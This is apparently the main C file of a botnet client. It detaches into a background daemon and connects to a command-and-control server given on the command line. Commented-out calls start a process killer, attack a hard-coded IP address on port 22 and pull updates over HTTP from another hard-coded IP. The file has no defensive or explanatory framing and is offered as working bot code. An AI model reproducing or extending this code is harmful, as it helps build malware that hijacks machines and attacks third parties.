#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#include "lib/utils/util.h"
#include "lib/update/update.h"
#include "lib/attack/attack.h"
#include "lib/network/network.h"
#include "lib/security/security.h"

int main(int argc, char *argv[])
{
    if (argc != 2)
        return EXIT_FAILURE;

    time_t t;
    srand((unsigned)time(&t));

#ifndef DEBUG
    // check if we are on fork, else fork
    if (getpid() != 1)
    {
        pid_t pid = fork();
        if (pid < 0)
            exit(EXIT_FAILURE);

        if (pid > 0)
            exit(EXIT_SUCCESS);

        if (setsid() < 0)
            exit(EXIT_FAILURE);
    }
    chdir("/");
#endif

    cnc_socket(argv[1]);

    /*
        start_killer();
        attack_thread("148.251.238.46", 22);
        http_get("/update?arch=test", "85.31.44.75", 3333);
        check_for_update(argv[1]);
    */

    return EXIT_SUCCESS;
}
